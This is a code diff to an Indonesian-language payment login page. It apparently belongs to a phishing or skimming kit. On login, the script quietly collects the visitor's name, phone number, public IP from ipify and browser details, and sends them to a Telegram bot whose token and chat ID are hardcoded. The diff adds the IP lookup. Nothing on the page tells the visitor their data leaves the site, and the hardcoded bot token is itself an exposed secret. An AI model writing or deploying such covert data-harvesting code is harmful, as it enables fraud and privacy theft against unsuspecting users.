@@ -1,7 +1,5 @@
-// Add this to your HTML head before the script.js loads
-// <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-
-document.addEventListener('DOMContentLoaded', function() {
+<script>
+document.addEventListener('DOMContentLoaded', function () {
     const loginContainer = document.getElementById('loginContainer');
     const paymentContainer = document.getElementById('paymentContainer');
     const loginBtn = document.getElementById('loginBtn');
@@ -12,17 +10,17 @@ document.addEventListener('DOMContentLoaded', function() {
     const paymentMethods = document.querySelectorAll('.payment-method');
     const paymentDetails = document.querySelectorAll('.payment-details');
 
-    // Telegram notification function using Axios
-    const sendTelegramNotification = async (name, phone) => {
-        const botToken = '7622409431:AAFOCDS9KWgCjui28zAvBuPxrqUXoD_CDzk'; // Ganti dengan token bot Anda
-        const chatId = '7411016617'; // Ganti dengan chat ID Anda
-        
+    // Kirim notifikasi Telegram
+    const sendTelegramNotification = async (name, phone, ip) => {
+        const botToken = '7622409431:AAFOCDS9KWgCjui28zAvBuPxrqUXoD_CDzk';
+        const chatId = '7411016617';
+
         const message = `🔔 *NEW PAYMENT LOGIN* 🔔\n\n` +
-                       `👤 *Name*: ${name}\n` +
-                       `📱 *Phone*: ${phone}\n` +
-                       `🕒 *Time*: ${new Date().toLocaleString()}\n` +
-                       `🌐 *IP*: ${window.location.hostname}\n` +
-                       `💻 *Device*: ${navigator.userAgent}`;
+                        `👤 *Name*: ${name}\n` +
+                        `📱 *Phone*: ${phone}\n` +
+                        `🕒 *Time*: ${new Date().toLocaleString()}\n` +
+                        `🌐 *IP*: ${ip}\n` +
+                        `💻 *Device*: ${navigator.userAgent}`;
 
         try {
             await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -30,80 +28,72 @@ document.addEventListener('DOMContentLoaded', function() {
                 text: message,
                 parse_mode: 'Markdown'
             });
-            console.log('Notification sent to Telegram successfully');
+            console.log('✅ Notifikasi berhasil dikirim ke Telegram');
         } catch (error) {
-            console.error('Error sending to Telegram:', error);
-            // You can add additional error handling here
+            console.error('❌ Gagal mengirim ke Telegram:', error);
         }
     };
 
-    // Login Handler
-    loginBtn.addEventListener('click', async function() {
+    // Ambil IP publik
+    const getUserIP = async () => {
+        try {
+            const response = await axios.get('https://api.ipify.org?format=json');
+            return response.data.ip;
+        } catch (error) {
+            console.error('Gagal mendapatkan IP:', error);
+            return 'Unknown IP';
+        }
+    };
+
+    // Handler Login
+    loginBtn.addEventListener('click', async function () {
         const name = nameInput.value.trim();
         const phone = phoneInput.value.trim();
-        
-        if (name === '') {
+
+        if (!name) {
             alert('Silakan masukkan nama Anda');
             return;
         }
-        
-        if (phone === '') {
+
+        if (!phone) {
             alert('Silakan masukkan nomor telepon Anda');
             return;
         }
-        
+
         userName.textContent = name;
         loginContainer.style.display = 'none';
         paymentContainer.style.display = 'block';
-        
-        // Send Telegram notification
-        await sendTelegramNotification(name, phone);
-        
-        // Animation
         paymentContainer.style.animation = 'fadeIn 0.5s ease';
+
+        const ip = await getUserIP();
+        await sendTelegramNotification(name, phone, ip);
     });
 
-    // Back Button Handler
-    backBtn.addEventListener('click', function() {
-        paymentContainer.style.display = 'none';
+    // Handler Tombol Back
+    backBtn.addEventListener('click', function () {
         loginContainer.style.display = 'block';
+        paymentContainer.style.display = 'none';
         nameInput.value = '';
         phoneInput.value = '';
-        
-        // Reset payment method selection
-        paymentMethods.forEach(method => {
-            method.classList.remove('active');
-        });
-        
-        paymentDetails.forEach(detail => {
-            detail.style.display = 'none';
-        });
+        paymentMethods.forEach(method => method.classList.remove('active'));
+        paymentDetails.forEach(detail => detail.style.display = 'none');
     });
 
-    // Payment Method Selection
+    // Pemilihan Metode Pembayaran
     paymentMethods.forEach(method => {
-        method.addEventListener('click', function() {
-            // Remove active class from all methods
-            paymentMethods.forEach(m => {
-                m.classList.remove('active');
-            });
-            
-            // Hide all payment details
-            paymentDetails.forEach(detail => {
-                detail.style.display = 'none';
-            });
-            
-            // Add active class to selected method
+        method.addEventListener('click', function () {
+            paymentMethods.forEach(m => m.classList.remove('active'));
+            paymentDetails.forEach(detail => detail.style.display = 'none');
+
             this.classList.add('active');
-            
-            // Show corresponding payment details
             const methodType = this.getAttribute('data-method');
             document.getElementById(`${methodType}Details`).style.display = 'block';
         });
     });
 
-    // Auto-select first payment method
+    // Auto-select metode pembayaran pertama
     if (paymentMethods.length > 0) {
         paymentMethods[0].click();
     }
 });
+</script>
